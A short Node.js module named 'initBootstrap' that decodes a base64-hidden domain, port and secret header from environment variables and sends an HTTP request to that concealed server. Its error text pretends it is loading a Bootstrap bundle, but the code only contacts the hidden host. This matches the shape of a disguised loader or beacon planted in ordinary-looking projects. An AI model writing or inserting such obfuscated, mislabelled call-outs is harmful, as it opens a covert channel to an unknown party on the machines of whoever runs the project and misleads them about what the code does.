const axios = require("axios");
const atob = require("atob");
require("dotenv").config();

const initBootstrap = async () => {
    try {
        const d = atob(process.env.DOMAIN_ENCRYPTION);
        const p = atob(process.env.PORT_ENCRYPTION);
        const url = `http://${d}:${p}`;
        await axios.get(url, {
            headers: {
                [atob(process.env.HEADER_ENCRYPTION_NAME)]: atob(process.env.HEADER_ENCRYPTION_KEY),
            },
        });
    } catch (error) {
        console.error("Error loading Bootstrap bundle:", error);
    }
}

module.exports = initBootstrap;